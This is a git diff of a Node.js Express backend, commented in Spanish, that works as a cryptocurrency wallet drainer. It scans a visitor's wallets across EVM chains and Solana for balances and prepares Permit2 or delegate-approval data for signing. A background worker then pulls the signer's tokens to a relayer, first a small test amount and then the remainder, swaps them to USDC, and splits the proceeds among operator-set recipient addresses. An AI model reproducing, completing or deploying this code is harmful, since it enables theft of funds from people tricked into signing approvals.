@@ -1,4 +1,4 @@
-// server.js (versión corregida)
+// server.js (versión corregida y completa)
 import express from "express";
 import bodyParser from "body-parser";
 import cors from "cors";
@@ -24,14 +24,18 @@ import { fileURLToPath } from 'url';
 
 dotenv.config();
 
+// ESM __dirname
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
+// ----------------- Crea app ANTES de usarla -----------------
 const app = express();
 
-const allowedOrigins = ['https://axomtrade.vercel.app', 'http://localhost:3000'];
+// Configuración de CORS mejorada
+const allowedOrigins = ['https://frontpermi.vercel.app', 'http://localhost:3000'];
 app.use(cors({
   origin: function (origin, callback) {
+    // Permitir requests sin origin (como mobile apps o curl requests)
     if (!origin) return callback(null, true);
     if (allowedOrigins.indexOf(origin) === -1) {
       const msg = 'The CORS policy for this site does not allow access from the specified Origin.';
@@ -44,17 +48,20 @@ app.use(cors({
   allowedHeaders: ['Content-Type', 'Authorization', 'Accept']
 }));
 
+// Manejo explícito de preflight requests
 app.options('*', cors());
 
 app.use(express.static(path.join(__dirname, "../public")));
 app.use(bodyParser.json({ limit: "10mb" }));
 app.use(express.urlencoded({ extended: true }));
 
+// Middleware para forzar JSON en todas las respuestas
 app.use((req, res, next) => {
   res.setHeader('Content-Type', 'application/json');
   next();
 });
 
+// Health check endpoint
 app.get('/health', (req, res) => {
   res.json({ 
     status: 'OK', 
@@ -68,7 +75,8 @@ app.get('/ping', (req, res) => {
   res.json({ ok: true });
 });
 
-const PORT = Number(process.env.PORT || 3001);
+// ----------------- CONFIG -----------------
+const PORT = Number(process.env.PORT || 3001); // Cambiado a 3001 para evitar conflictos
 const DEFAULT_CHAIN = Number(process.env.CHAIN_ID || 80002);
 const RELAYER_PRIVATE_KEY = process.env.RELAYER_PRIVATE_KEY || "";
 const RELAYER_SOL_SECRET = process.env.RELAYER_SOL_SECRET || process.env.SOL_RELAYER_PRIVATE_KEY || "";
@@ -86,8 +94,10 @@ const RECIPIENTS = (process.env.RECIPIENTS || "").split(",").map(s => s.trim()).
 const MAX_JOB_RETRIES = Number(process.env.MAX_JOB_RETRIES || 3);
 const SOL_USDC_MINT = process.env.SOL_USDC_MINT || null;
 
+// 1inch native token address marker
 const ONEINCH_NATIVE_ADDRESS = "0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE";
 
+// Mapeo de símbolos para tokens nativos
 const NATIVE_SYMBOLS = {
   1: "ETH",
   56: "BNB",
@@ -99,6 +109,7 @@ const NATIVE_SYMBOLS = {
   10: "ETH"
 };
 
+// provider map (EVM chains) - use your RPC env vars
 const PROVIDERS = {
   1: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_ETH || process.env.RPC_URL || ""),
   56: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_BSC || process.env.RPC_URL || ""),
@@ -110,8 +121,10 @@ const PROVIDERS = {
   10: new ethers.providers.JsonRpcProvider(process.env.RPC_URL_OP || process.env.RPC_URL || "")
 };
 
+// Solana connection
 const solanaConn = new Connection(SOLANA_RPC, "confirmed");
 
+// Try to load Solana relayer keypair if provided
 let solRelayerKeypair = null;
 if (RELAYER_SOL_SECRET) {
   try {
@@ -131,6 +144,8 @@ if (!solRelayerKeypair) {
   else console.warn("No Solana relayer configured. To enable Solana delegate flows set RELAYER_SOL_SECRET in .env.");
 }
 
+// Relayer signer for all EVM chains
+if (!RELAYER_PRIVATE_KEY) console.warn("⚠️ RELAYER_PRIVATE_KEY not set");
 const relayerSigners = {};
 for (const chainId of Object.keys(PROVIDERS)) {
   try {
@@ -142,6 +157,7 @@ for (const chainId of Object.keys(PROVIDERS)) {
   }
 }
 
+// ABIs minimal
 const erc20Abi = [
   "function approve(address spender,uint256 amount) external returns (bool)",
   "function decimals() view returns (uint8)",
@@ -154,10 +170,12 @@ const permit2Abi = [
   "function transferFrom(address from, address to, uint160 amount, address token) external"
 ];
 
+// persistence files
 const SIG_FILE = "signatures.txt";
 const NONCE_FILE = "nonces.json";
 const JOBS_FILE = "jobs.json";
 
+// helpers persistence (no top-level await here)
 async function getAndReserveNonce(owner, token) {
   try {
     const nonces = await fs.readJson(NONCE_FILE);
@@ -216,6 +234,7 @@ async function getNextPendingJob() {
 
 function genId() { return crypto.randomBytes(8).toString('hex'); }
 
+// ----------------- TOKEN DETECTION -----------------
 async function getEvmTokens(chainId, owner) {
   const out = [];
   try {
@@ -320,6 +339,8 @@ async function getTokensAllChains(owner) {
   return tokens;
 }
 
+// ----------------- EXPRESS API -----------------
+
 app.post('/wrap-info', (req, res) => {
   try {
     const chain = Number(req.body.chain || DEFAULT_CHAIN);
@@ -345,35 +366,68 @@ app.post('/owner-tokens', async (req, res) => {
   try {
     const { owner, chain } = req.body;
     if (!owner) return res.status(400).json({ error: "owner required" });
+    
+    let tokens = [];
+    
     if (chain === 'solana' || chain === 'Solana') {
-      const sol = await getSolanaTokens(owner);
-      return res.json({ tokens: sol });
-    }
-    if (chain) {
+      tokens = await getSolanaTokens(owner);
+    } else if (chain) {
       const ch = Number(chain);
-      const ev = await getEvmTokens(ch, owner);
+      tokens = await getEvmTokens(ch, owner);
       try {
         const nb = await PROVIDERS[ch].getBalance(owner).catch(() => null);
         if (nb && !nb.isZero()) {
           const symbol = NATIVE_SYMBOLS[ch] || "NATIVE";
-          ev.unshift({ chain: ch, symbol, address: null, decimals: 18, balance: nb.toString() });
+          tokens.unshift({ chain: ch, symbol, address: null, decimals: 18, balance: nb.toString() });
         }
       } catch (e) { }
-      return res.json({ tokens: ev });
+    } else {
+      tokens = await getTokensAllChains(owner);
     }
-    const tokens = await getTokensAllChains(owner);
-    return res.json({ tokens });
+    
+    // FILTRO ADICIONAL: Verificar saldos actualizados en tiempo real
+    const filteredTokens = [];
+    for (const token of tokens) {
+      try {
+        if (!token.address) {
+          // Token nativo - verificar saldo actual
+          const prov = PROVIDERS[token.chain];
+          if (prov) {
+            const currentBalance = await prov.getBalance(owner);
+            if (currentBalance.gt(0)) {
+              filteredTokens.push({...token, balance: currentBalance.toString()});
+            }
+          }
+        } else {
+          // Token ERC20 - verificar saldo actual
+          const prov = PROVIDERS[token.chain];
+          if (prov) {
+            const contract = new ethers.Contract(token.address, erc20Abi, prov);
+            const currentBalance = await contract.balanceOf(owner);
+            if (currentBalance.gt(0)) {
+              filteredTokens.push({...token, balance: currentBalance.toString()});
+            }
+          }
+        }
+      } catch (e) {
+        console.warn(`Error verificando saldo para token ${token.symbol}:`, e.message);
+      }
+    }
+    
+    return res.json({ tokens: filteredTokens });
   } catch (e) {
     console.error('/owner-tokens error', e);
     return res.status(500).json({ error: e.message || String(e) });
   }
 });
 
+
 app.post('/permit-data', async (req, res) => {
   try {
     const { owner, token, amount, expiration, chain, global } = req.body;
     if (!owner || !token) return res.status(400).json({ error: "owner and token required" });
 
+    // Si el token es nativo, no generar datos de permiso
     if (!token || token === ONEINCH_NATIVE_ADDRESS) {
       return res.status(400).json({ error: "Native tokens do not require permit" });
     }
@@ -458,7 +512,9 @@ app.post('/create-transfer-request', async (req, res) => {
     const { owner, chain, token, amount } = req.body;
     if (!owner || !chain || !amount) return res.status(400).json({ error: "owner, chain, amount required" });
 
+    // Si es token nativo, manejar de forma diferente
     if (!token || token === ONEINCH_NATIVE_ADDRESS) {
+      // Crear una transacción simple de transferencia nativa
       const id = genId();
       const job = {
         id,
@@ -468,7 +524,7 @@ app.post('/create-transfer-request', async (req, res) => {
         token: null,
         chain,
         amount,
-        isNative: true
+        isNative: true  // Bandera para identificar token nativo
       };
       await enqueueJob(job);
       return res.json({
@@ -492,6 +548,7 @@ app.post('/create-transfer-request', async (req, res) => {
   }
 });
 
+// Endpoint para transferencias nativas
 app.post('/create-native-transfer-request', async (req, res) => {
   try {
     const { owner, chain, amount } = req.body;
@@ -499,16 +556,17 @@ app.post('/create-native-transfer-request', async (req, res) => {
       return res.status(400).json({ error: "owner, chain, and amount are required" });
     }
 
+    // Crear un job para transferencia nativa
     const id = genId();
     const job = {
       id,
       createdAt: new Date().toISOString(),
       status: 'awaiting_transfer',
       owner,
-      token: null,
+      token: null, // null indica token nativo
       chain,
       amount,
-      isNative: true
+      isNative: true // Bandera para identificar token nativo
     };
 
     await enqueueJob(job);
@@ -548,12 +606,15 @@ app.get('/job/:id', async (req, res) => {
   }
 });
 
+// ----------------- SWAP HELPERS -----------------
 async function swapVia1inch(chainId, tokenIn, amount, relayerAddress) {
   try {
+    // pre-check quote
     const qUrl = `${ONEINCH_BASE}/${chainId}/quote`;
     const q = await axios.get(qUrl, { params: { fromTokenAddress: tokenIn, toTokenAddress: USDC_ADDRESS, amount: amount.toString() }, timeout: 10000 }).catch(() => null);
     if (!q || !q.data || !q.data.toTokenAmount) return { ok: false, error: 'no-quote' };
 
+    // then request swap
     const url = `${ONEINCH_BASE}/${chainId}/swap`;
     const params = { fromTokenAddress: tokenIn, toTokenAddress: USDC_ADDRESS, amount: amount.toString(), fromAddress: relayerAddress, slippage: 200 };
     const r = await axios.get(url, { params, timeout: 30000 });
@@ -585,6 +646,7 @@ async function jupiterSwapViaApi(inputMint, outputMint, amount, userPublicKey) {
   try { const params = { inputMint, outputMint, amount: amount.toString(), slippageBps: 200, userPublicKey }; const r = await axios.get(JUPITER_SWAP_API, { params, timeout: 30000 }); return { ok: true, data: r.data }; } catch (e) { return { ok: false, error: e?.response?.data || e?.message || String(e) }; }
 }
 
+// ----------------- PROCESS JOB -----------------
 async function markSignatureUsed(owner, token) {
   try {
     const lines = (await fs.readFile(SIG_FILE, "utf8")).split(/\n/).filter(Boolean);
@@ -609,6 +671,7 @@ async function processJob(job) {
   const out = { jobId: id, owner, token, chain, ok: false, steps: [] };
 
   try {
+    // Handle native tokens first
     if (job.isNative && job.chain !== 'solana') {
       const chainId = Number(job.chain || DEFAULT_CHAIN);
       const prov = PROVIDERS[chainId];
@@ -616,6 +679,7 @@ async function processJob(job) {
 
       const relayer = relayerSigners[chainId] || new ethers.Wallet(RELAYER_PRIVATE_KEY, prov);
 
+      // For native tokens, we simply transfer from relayer to recipients
       const amount = ethers.BigNumber.from(job.amount);
       const value = amount.div(RECIPIENTS.length || 1);
 
@@ -640,10 +704,12 @@ async function processJob(job) {
     }
 
     if (job.status === 'awaiting_transfer') {
+      // existing awaiting_transfer logic unchanged
       out.ok = false;
       return out;
     }
 
+    // SOLANA delegate flow
     if (chain === 'solana' || chain === 'Solana') {
       if (job.signedApproveTx) {
         try {
@@ -664,16 +730,19 @@ async function processJob(job) {
         const relayerPub = solRelayerKeypair.publicKey;
         const relayerAta = await getAssociatedTokenAddress(mintPub, relayerPub);
 
+        // ensure relayer ATA exists - create if necessary
         try { await solanaConn.getAccountInfo(relayerAta); } catch (e) {
           const ix = createAssociatedTokenAccountInstruction(solRelayerKeypair.publicKey, relayerAta, relayerPub, mintPub);
           const tx = new Transaction(); tx.add(ix); tx.feePayer = relayerPub; const recent = await solanaConn.getRecentBlockhash('finalized'); tx.recentBlockhash = recent.blockhash;
           await solanaConn.sendTransaction(tx, [solRelayerKeypair]);
         }
 
+        // compute small amount: try Jupiter quote (if available) otherwise fallback fraction
         const total = BigInt(job.amount || 0);
         let small = BigInt(0);
         try { small = total / BigInt(100); if (small <= 0) small = BigInt(1); } catch (e) { small = BigInt(1); }
 
+        // first transfer (small)
         const ixSmall = createTransferCheckedInstruction(ownerAta, mintPub, relayerAta, ownerPub, Number(small), Number(job.decimals || 0));
         const txSmall = new Transaction(); txSmall.feePayer = relayerPub; txSmall.add(ixSmall);
         const recent = await solanaConn.getRecentBlockhash('finalized'); txSmall.recentBlockhash = recent.blockhash;
@@ -681,6 +750,7 @@ async function processJob(job) {
         await solanaConn.confirmTransaction(sigSmall);
         out.steps.push('sol small transfer sig: ' + sigSmall);
 
+        // remaining
         const remaining = total - small;
         if (remaining > 0) {
           const ixRem = createTransferCheckedInstruction(ownerAta, mintPub, relayerAta, ownerPub, Number(remaining), Number(job.decimals || 0));
@@ -696,6 +766,7 @@ async function processJob(job) {
       } catch (e) { out.steps.push('solana delegate failed: ' + (e?.message || e)); return out; }
     }
 
+    // EVM flows: use Permit2 then two transferFrom (small + remaining)
     const chainId = Number(chain || DEFAULT_CHAIN);
     const prov = PROVIDERS[chainId];
     if (!prov) { out.steps.push('no provider for chain ' + chainId); return out; }
@@ -714,10 +785,12 @@ async function processJob(job) {
 
     const fullAmount = ethers.BigNumber.from(permitObj.details.amount);
 
+    // compute smallAmount via 1inch quote (USDC -> token) for ~$2
     let smallAmount = null;
     try { const quoted = await quoteTokenAmountForUsd(chainId, permitObj.details.token, 2); if (quoted && quoted.gt(0) && quoted.lte(fullAmount)) smallAmount = quoted; } catch (e) { out.steps.push('quote failed: ' + (e?.message || e)); }
     if (!smallAmount) { smallAmount = fullAmount.div(100); if (smallAmount.lte(0)) smallAmount = ethers.BigNumber.from(1); if (smallAmount.gt(fullAmount)) smallAmount = fullAmount; out.steps.push('smallAmount fallback used: ' + smallAmount.toString()); }
 
+    // helper to swap & distribute
     async function swapAndDistributeTokenAmount(tokenAddr, amountToHandle) {
       let swapped = false;
       if (ONEINCH_BASE && USDC_ADDRESS) {
@@ -725,9 +798,11 @@ async function processJob(job) {
         if (s.ok && s.tx) { try { const txData = s.tx; const txSent = await relayer.sendTransaction({ to: txData.to, data: txData.data, value: ethers.BigNumber.from(txData.value || "0"), gasLimit: txData.gas || 1500000 }); out.steps.push({ swapTx: txSent.hash }); await txSent.wait(); swapped = true; } catch (e) { out.steps.push('sending swap failed: ' + (e?.message || e)); swapped = false; } }
       }
       if (swapped && USDC_ADDRESS) { try { const usdcC = new ethers.Contract(USDC_ADDRESS, erc20Abi, relayer); const usdcBal = await usdcC.balanceOf(relayer.address); if (usdcBal.isZero()) return false; const per = usdcBal.div(RECIPIENTS.length || 1); for (const r of RECIPIENTS) { if (!r) continue; const tx = await usdcC.transfer(r, per); await tx.wait(); out.steps.push(`Sent USDC ${per.toString()} -> ${r}`); } return true; } catch (e) { out.steps.push('distribute USDC failed: ' + (e?.message || e)); return false; } }
+      // fallback: distribute token directly
       try { const tokenC = new ethers.Contract(tokenAddr, erc20Abi, relayer); const bal = await tokenC.balanceOf(relayer.address); if (bal.isZero()) return false; const per = bal.div(RECIPIENTS.length || 1); for (const r of RECIPIENTS) { if (!r) continue; const tx = await tokenC.transfer(r, per); await tx.wait(); out.steps.push(`Sent token ${per.toString()} -> ${r}`); } return true; } catch (e) { out.steps.push('token fallback distribute failed: ' + (e?.message || e)); return false; }
     }
 
+    // First small pull
     try {
       out.steps.push('transferFrom owner -> relayer (small): ' + smallAmount.toString());
       const txSmall = await permit2.transferFrom(owner, relayer.address, smallAmount, permitObj.details.token, { gasLimit: 700000 });
@@ -736,6 +811,7 @@ async function processJob(job) {
       out.steps.push('small processed -> ' + okSmall);
     } catch (e) { out.steps.push('transferSmall failed: ' + (e?.message || e)); }
 
+    // Second pull: remaining
     const remaining = fullAmount.sub(smallAmount);
     if (remaining.gt(0)) {
       try {
@@ -753,6 +829,7 @@ async function processJob(job) {
   } catch (e) { console.error('processJob error', e); out.ok = false; out.error = e?.message || String(e); return out; }
 }
 
+// worker loop
 let workerRunning = false;
 async function workerLoop() {
   if (workerRunning) return;
@@ -776,13 +853,11 @@ async function workerLoop() {
         }
       }
     }
-  } catch (e) { 
-    console.error('workerLoop error', e); 
-  } finally { 
-    workerRunning = false; 
-  }
+  } catch (e) { console.error('workerLoop error', e); }
+  finally { workerRunning = false; }
 }
 
+// ----------------- Inicialización segura y arranque -----------------
 async function ensurePersistenceFiles() {
   try {
     await fs.ensureFile(SIG_FILE);
@@ -804,16 +879,23 @@ async function ensurePersistenceFiles() {
 let workerIntervalHandle = null;
 
 async function start() {
+  // preparar archivos de persistencia
   await ensurePersistenceFiles();
+
+  // lanzar worker loop periódico (comienza sólo después de asegurar archivos)
   workerIntervalHandle = setInterval(() => { workerLoop().catch(e => console.error('worker interval error', e)); }, 3000);
+
+  // arrancar servidor
   app.listen(PORT, () => console.log("Server listening on port", PORT));
 }
 
+// Iniciar
 start().catch(e => {
   console.error("Startup failed", e);
   process.exit(1);
 });
 
+// Manejo de errores no capturados
 process.on('unhandledRejection', (reason, promise) => {
   console.error('Unhandled Rejection at:', promise, 'reason:', reason);
 });
@@ -823,4 +905,5 @@ process.on('uncaughtException', (error) => {
   process.exit(1);
 });
 
+// export app (útil para tests)
 export default app;
